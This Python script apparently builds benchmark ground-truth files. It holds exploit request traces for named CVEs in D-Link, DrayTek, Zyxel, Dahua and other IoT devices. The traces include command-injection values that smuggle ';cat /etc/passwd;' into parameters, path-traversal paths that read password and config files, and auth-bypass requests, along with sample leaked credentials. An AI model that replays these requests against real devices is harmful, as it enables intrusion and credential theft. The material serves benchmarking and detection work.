"""Generate missing trace JSON files from ground truth data."""
import json
from pathlib import Path

TRACES_DIR = Path(__file__).parent.parent / "benchmarks" / "traces"

existing = {p.stem for p in TRACES_DIR.glob("CVE-*.json")}

traces = [
    {
        "cve_id": "CVE-2024-10915",
        "vendor": "D-Link",
        "product": "DNS-320L",
        "vuln_class": "CMDi",
        "severity": "CRITICAL",
        "source": "https://nvd.nist.gov/vuln/detail/CVE-2024-10915",
        "trace": {
            "request": {
                "method": "GET",
                "path": "/cgi-bin/account_mgr.cgi",
                "params": {"cmd": "cgi_user_add", "group": "';cat /etc/passwd;'"},
                "headers": {},
                "body": None
            },
            "response": {
                "status_code": 200,
                "headers": {"Content-Type": "text/html"},
                "body": "root:x:0:0:root:/root:/bin/bash\n"
            }
        },
        "payload_encoding": "none",
        "decoded_payload": "cat /etc/passwd"
    },
    {
        "cve_id": "CVE-2024-12987",
        "vendor": "DrayTek",
        "product": "Vigor2960",
        "vuln_class": "CMDi",
        "severity": "CRITICAL",
        "source": "https://nvd.nist.gov/vuln/detail/CVE-2024-12987",
        "trace": {
            "request": {
                "method": "POST",
                "path": "/cgi-bin/mainfunction.cgi/apmcfgupload",
                "params": {},
                "headers": {"Content-Type": "application/x-www-form-urlencoded"},
                "body": "session=';cat /etc/passwd;'"
            },
            "response": {
                "status_code": 200,
                "headers": {"Content-Type": "text/html"},
                "body": "root:x:0:0:root:/root:/bin/bash\n"
            }
        },
        "payload_encoding": "none",
        "decoded_payload": "cat /etc/passwd"
    },
    {
        "cve_id": "CVE-2024-12986",
        "vendor": "DrayTek",
        "product": "Vigor2960",
        "vuln_class": "CMDi",
        "severity": "CRITICAL",
        "source": "https://nvd.nist.gov/vuln/detail/CVE-2024-12986",
        "trace": {
            "request": {
                "method": "POST",
                "path": "/cgi-bin/mainfunction.cgi",
                "params": {},
                "headers": {"Content-Type": "application/x-www-form-urlencoded"},
                "body": "action=doPPPoE&table=';cat /etc/passwd;'"
            },
            "response": {
                "status_code": 200,
                "headers": {"Content-Type": "text/html"},
                "body": "root:x:0:0:root:/root:/bin/bash\n"
            }
        },
        "payload_encoding": "none",
        "decoded_payload": "cat /etc/passwd"
    },
    {
        "cve_id": "CVE-2024-7120",
        "vendor": "Raisecom",
        "product": "MSG1200",
        "vuln_class": "CMDi",
        "severity": "CRITICAL",
        "source": "https://www.exploit-db.com/exploits/52034",
        "trace": {
            "request": {
                "method": "POST",
                "path": "/vpn/list_base_config.php",
                "params": {},
                "headers": {"Content-Type": "application/x-www-form-urlencoded"},
                "body": "template=;cat /etc/passwd;"
            },
            "response": {
                "status_code": 200,
                "headers": {"Content-Type": "text/html"},
                "body": "root:x:0:0:root:/root:/bin/bash\n"
            }
        },
        "payload_encoding": "none",
        "decoded_payload": "cat /etc/passwd"
    },
    {
        "cve_id": "CVE-2024-4582",
        "vendor": "Faraday",
        "product": "GM8181",
        "vuln_class": "CMDi",
        "severity": "HIGH",
        "source": "https://vuldb.com/?id.263304",
        "trace": {
            "request": {
                "method": "GET",
                "path": "/cgi-bin/ntp.cgi",
                "params": {"ntp_srv": ";cat /etc/passwd;"},
                "headers": {},
                "body": None
            },
            "response": {
                "status_code": 200,
                "headers": {"Content-Type": "text/html"},
                "body": "root:x:0:0:root:/root:/bin/bash\n"
            }
        },
        "payload_encoding": "none",
        "decoded_payload": "cat /etc/passwd"
    },
    {
        "cve_id": "CVE-2024-3721",
        "vendor": "TBK",
        "product": "DVR4104",
        "vuln_class": "CMDi",
        "severity": "HIGH",
        "source": "https://github.com/netsecfish/tbk_dvr_command_injection",
        "trace": {
            "request": {
                "method": "GET",
                "path": "/device.rsp",
                "params": {
                    "opt": "sys",
                    "cmd": "___S_O_S_T_R_E_A_MAX___",
                    "mdb": "sos",
                    "mdc": ";cat /etc/passwd;"
                },
                "headers": {"Cookie": "uid=1"},
                "body": None
            },
            "response": {
                "status_code": 200,
                "headers": {"Content-Type": "text/html"},
                "body": "root:x:0:0:root:/root:/bin/bash\n"
            }
        },
        "payload_encoding": "none",
        "decoded_payload": "cat /etc/passwd"
    },
    {
        "cve_id": "CVE-2023-4474",
        "vendor": "Zyxel",
        "product": "NAS326",
        "vuln_class": "CMDi",
        "severity": "CRITICAL",
        "source": "https://isc.sans.edu/diary/30884/",
        "trace": {
            "request": {
                "method": "POST",
                "path": "/cmd,/ck6fup6/portal_main/pkg_init_cmd/register_main/setCookie",
                "params": {},
                "headers": {"Content-Type": "application/x-www-form-urlencoded"},
                "body": "cmd=;cat /etc/passwd;"
            },
            "response": {
                "status_code": 200,
                "headers": {"Content-Type": "text/html"},
                "body": "root:x:0:0:root:/root:/bin/bash\n"
            }
        },
        "payload_encoding": "none",
        "decoded_payload": "cat /etc/passwd"
    },
    {
        "cve_id": "CVE-2024-12897",
        "vendor": "Intelbras",
        "product": "VIP S3020",
        "vuln_class": "PT",
        "severity": "HIGH",
        "source": "https://nvd.nist.gov/vuln/detail/CVE-2024-12897",
        "trace": {
            "request": {
                "method": "GET",
                "path": "/../mtd/Config/Sha1Account1",
                "params": {},
                "headers": {},
                "body": None
            },
            "response": {
                "status_code": 200,
                "headers": {"Content-Type": "text/plain"},
                "body": "admin:tlJwpbo6\nuser1:HuiYE2\n"
            }
        },
        "payload_encoding": "none",
        "decoded_payload": "/../mtd/Config/Sha1Account1"
    },
    {
        "cve_id": "CVE-2017-7577",
        "vendor": "Xiongmai",
        "product": "uc-httpd",
        "vuln_class": "PT",
        "severity": "HIGH",
        "source": "https://www.vulncheck.com/blog/xiongmai-iot-exploitation",
        "trace": {
            "request": {
                "method": "GET",
                "path": "/../../etc/passwd",
                "params": {},
                "headers": {},
                "body": None
            },
            "response": {
                "status_code": 200,
                "headers": {"Content-Type": "text/plain"},
                "body": "root:$1$ybdHbPDn$ii9aEIFNiolBbM9QxW9mr0:0:0::/root:/bin/sh\n"
            }
        },
        "payload_encoding": "none",
        "decoded_payload": "/../../etc/passwd"
    },
    {
        "cve_id": "CVE-2013-6023",
        "vendor": "TVT",
        "product": "TD-2308SS-B",
        "vuln_class": "PT",
        "severity": "HIGH",
        "source": "https://www.exploit-db.com/exploits/29959",
        "trace": {
            "request": {
                "method": "GET",
                "path": "/../../../mnt/mtd/config/config.dat",
                "params": {},
                "headers": {},
                "body": None
            },
            "response": {
                "status_code": 200,
                "headers": {"Content-Type": "application/octet-stream"},
                "body": "[ACCOUNT]\nuser=admin\npassword=admin123\n"
            }
        },
        "payload_encoding": "none",
        "decoded_payload": "/../../../mnt/mtd/config/config.dat"
    },
    {
        "cve_id": "CVE-2024-3274",
        "vendor": "D-Link",
        "product": "DNS-320L",
        "vuln_class": "InfoLeak",
        "severity": "MEDIUM",
        "source": "https://nvd.nist.gov/vuln/detail/cve-2024-3274",
        "trace": {
            "request": {
                "method": "GET",
                "path": "/cgi-bin/info.cgi",
                "params": {},
                "headers": {},
                "body": None
            },
            "response": {
                "status_code": 200,
                "headers": {"Content-Type": "text/xml"},
                "body": "<?xml version=\"1.0\"?>\n<info>\n<model>DNS-320L</model>\n<firmware>1.11</firmware>\n<mac>AA:BB:CC:DD:EE:FF</mac>\n</info>\n"
            }
        },
        "payload_encoding": "none",
        "decoded_payload": None
    },
    {
        "cve_id": "CVE-2024-10916",
        "vendor": "D-Link",
        "product": "DNS-320",
        "vuln_class": "InfoLeak",
        "severity": "MEDIUM",
        "source": "https://nvd.nist.gov/vuln/detail/CVE-2024-10916",
        "trace": {
            "request": {
                "method": "GET",
                "path": "/xml/info.xml",
                "params": {},
                "headers": {},
                "body": None
            },
            "response": {
                "status_code": 200,
                "headers": {"Content-Type": "text/xml"},
                "body": "<?xml version=\"1.0\"?>\n<info>\n<model>DNS-320</model>\n<version>2.05</version>\n<hostname>dlink-NAS</hostname>\n</info>\n"
            }
        },
        "payload_encoding": "none",
        "decoded_payload": None
    },
    {
        "cve_id": "CVE-2024-7339",
        "vendor": "TVT",
        "product": "TD-2104TS",
        "vuln_class": "InfoLeak",
        "severity": "MEDIUM",
        "source": "https://nvd.nist.gov/vuln/detail/CVE-2024-7339",
        "trace": {
            "request": {
                "method": "POST",
                "path": "/queryDevInfo",
                "params": {},
                "headers": {"Content-Type": "application/json"},
                "body": "{}"
            },
            "response": {
                "status_code": 200,
                "headers": {"Content-Type": "application/json"},
                "body": "{\"DevModel\":\"TD-2104TS\",\"SoftwareVersion\":\"3.2.0\",\"SerialNo\":\"ABC123456\",\"NetConfig\":{\"ip\":\"192.168.1.100\"}}\n"
            }
        },
        "payload_encoding": "none",
        "decoded_payload": None
    },
    {
        "cve_id": "CVE-2024-4583",
        "vendor": "Faraday",
        "product": "GM8181",
        "vuln_class": "InfoLeak",
        "severity": "MEDIUM",
        "source": "https://vuldb.com/?id.263305",
        "trace": {
            "request": {
                "method": "GET",
                "path": "/cgi-bin/credentials",
                "params": {},
                "headers": {},
                "body": None
            },
            "response": {
                "status_code": 200,
                "headers": {"Content-Type": "text/plain"},
                "body": "admin:admin123\nuser:user456\n"
            }
        },
        "payload_encoding": "none",
        "decoded_payload": None
    },
    {
        "cve_id": "CVE-2024-4584",
        "vendor": "Faraday",
        "product": "GM8181",
        "vuln_class": "InfoLeak",
        "severity": "MEDIUM",
        "source": "https://nvd.nist.gov/vuln/detail/cve-2024-4584",
        "trace": {
            "request": {
                "method": "GET",
                "path": "/command_port.ini",
                "params": {},
                "headers": {},
                "body": None
            },
            "response": {
                "status_code": 200,
                "headers": {"Content-Type": "text/plain"},
                "body": "[CommandPort]\nport=8080\nprotocol=tcp\n"
            }
        },
        "payload_encoding": "none",
        "decoded_payload": None
    },
    {
        "cve_id": "CVE-2024-12896",
        "vendor": "Intelbras",
        "product": "VIP S3020",
        "vuln_class": "InfoLeak",
        "severity": "MEDIUM",
        "source": "https://nvd.nist.gov/vuln/detail/CVE-2024-12896",
        "trace": {
            "request": {
                "method": "GET",
                "path": "/web_caps/webCapsConfig",
                "params": {},
                "headers": {},
                "body": None
            },
            "response": {
                "status_code": 200,
                "headers": {"Content-Type": "text/xml"},
                "body": "<?xml version=\"1.0\"?>\n<WebCaps>\n<DeviceType>IPC</DeviceType>\n<SupportPTZ>true</SupportPTZ>\n<MaxChannel>1</MaxChannel>\n</WebCaps>\n"
            }
        },
        "payload_encoding": "none",
        "decoded_payload": None
    },
    {
        "cve_id": "CVE-2024-12984",
        "vendor": "Amcrest",
        "product": "IP2M-841B",
        "vuln_class": "InfoLeak",
        "severity": "MEDIUM",
        "source": "https://nvd.nist.gov/vuln/detail/CVE-2024-12984",
        "trace": {
            "request": {
                "method": "GET",
                "path": "/web_caps/webCapsConfig",
                "params": {},
                "headers": {},
                "body": None
            },
            "response": {
                "status_code": 200,
                "headers": {"Content-Type": "text/xml"},
                "body": "<?xml version=\"1.0\"?>\n<WebCaps>\n<DeviceType>IPC</DeviceType>\n<SupportPTZ>false</SupportPTZ>\n<MaxChannel>1</MaxChannel>\n</WebCaps>\n"
            }
        },
        "payload_encoding": "none",
        "decoded_payload": None
    },
    {
        "cve_id": "CVE-2024-3160",
        "vendor": "Intelbras",
        "product": "MHDX1008",
        "vuln_class": "InfoLeak",
        "severity": "LOW",
        "source": "https://nvd.nist.gov/vuln/detail/CVE-2024-3160",
        "trace": {
            "request": {
                "method": "GET",
                "path": "/cap.js",
                "params": {},
                "headers": {},
                "body": None
            },
            "response": {
                "status_code": 200,
                "headers": {"Content-Type": "application/javascript"},
                "body": "var caps={\"deviceType\":\"DVR\",\"maxChannel\":8,\"supportWifi\":false,\"firmwareVersion\":\"4.001.0000001.2\"};\n"
            }
        },
        "payload_encoding": "none",
        "decoded_payload": None
    },
    {
        "cve_id": "CVE-2017-5892",
        "vendor": "ASUS",
        "product": "RT-AC66U",
        "vuln_class": "InfoLeak",
        "severity": "MEDIUM",
        "source": "https://wwws.nightwatchcybersecurity.com/2017/05/09/multiple-vulnerabilities-in-asus-routers/",
        "trace": {
            "request": {
                "method": "GET",
                "path": "/findasus.json",
                "params": {},
                "headers": {},
                "body": None
            },
            "response": {
                "status_code": 200,
                "headers": {"Content-Type": "application/json"},
                "body": "{\"modelName\":\"RT-AC66U\",\"ssid\":\"ASUS_HOME\",\"localIp\":\"192.168.1.1\",\"wanIp\":\"203.0.113.1\"}\n"
            }
        },
        "payload_encoding": "none",
        "decoded_payload": None
    },
    {
        "cve_id": "CVE-2014-4019",
        "vendor": "ZTE",
        "product": "ZXV10 W300",
        "vuln_class": "InfoLeak",
        "severity": "HIGH",
        "source": "https://www.exploit-db.com/exploits/33803",
        "trace": {
            "request": {
                "method": "GET",
                "path": "/rom-0",
                "params": {},
                "headers": {},
                "body": None
            },
            "response": {
                "status_code": 200,
                "headers": {"Content-Type": "application/octet-stream"},
                "body": "<binary configuration backup containing router password>"
            }
        },
        "payload_encoding": "none",
        "decoded_payload": None
    },
    {
        "cve_id": "CVE-2024-3272",
        "vendor": "D-Link",
        "product": "DNS-320L",
        "vuln_class": "AuthBypass",
        "severity": "CRITICAL",
        "source": "https://github.com/ian-bishop/dlink-CVE-2024-3272",
        "trace": {
            "request": {
                "method": "GET",
                "path": "/cgi-bin/nas_sharing.cgi",
                "params": {"user": "messagebus", "passwd": "", "cmd": "15", "system": ""},
                "headers": {},
                "body": None
            },
            "response": {
                "status_code": 200,
                "headers": {"Content-Type": "text/html"},
                "body": "success\n"
            }
        },
        "payload_encoding": "none",
        "decoded_payload": None
    },
    {
        "cve_id": "CVE-2017-7925",
        "vendor": "Dahua",
        "product": "DH-IPC-HDW23A0RN",
        "vuln_class": "AuthBypass",
        "severity": "CRITICAL",
        "source": "https://www.cisa.gov/news-events/ics-advisories/icsa-17-124-02",
        "trace": {
            "request": {
                "method": "GET",
                "path": "/current_config/passwd",
                "params": {},
                "headers": {},
                "body": None
            },
            "response": {
                "status_code": 200,
                "headers": {"Content-Type": "text/plain"},
                "body": "id:1:name:admin:passwd:admin123:grp:admin\nid:2:name:user:passwd:user456:grp:user\n"
            }
        },
        "payload_encoding": "none",
        "decoded_payload": None
    },
    {
        "cve_id": "CVE-2013-3586",
        "vendor": "Samsung",
        "product": "SRN-1670D",
        "vuln_class": "AuthBypass",
        "severity": "HIGH",
        "source": "https://www.exploit-db.com/exploits/27753",
        "trace": {
            "request": {
                "method": "GET",
                "path": "/cgi-bin/setup_user",
                "params": {},
                "headers": {"Cookie": "SessionID=bypass123"},
                "body": None
            },
            "response": {
                "status_code": 200,
                "headers": {"Content-Type": "text/html"},
                "body": "<html><body><table><tr><td>admin</td><td>password123</td></tr></table></body></html>\n"
            }
        },
        "payload_encoding": "none",
        "decoded_payload": None
    }
]

written = 0
for t in traces:
    cve_id = t["cve_id"]
    if cve_id in existing:
        print(f"SKIP (exists): {cve_id}")
        continue
    path = TRACES_DIR / f"{cve_id}.json"
    path.write_text(json.dumps(t, indent=2, ensure_ascii=False) + "\n", encoding="utf-8")
    written += 1
    print(f"WROTE: {cve_id}")

print(f"\nTotal written: {written}")
print(f"Total traces: {len(list(TRACES_DIR.glob('CVE-*.json')))}")
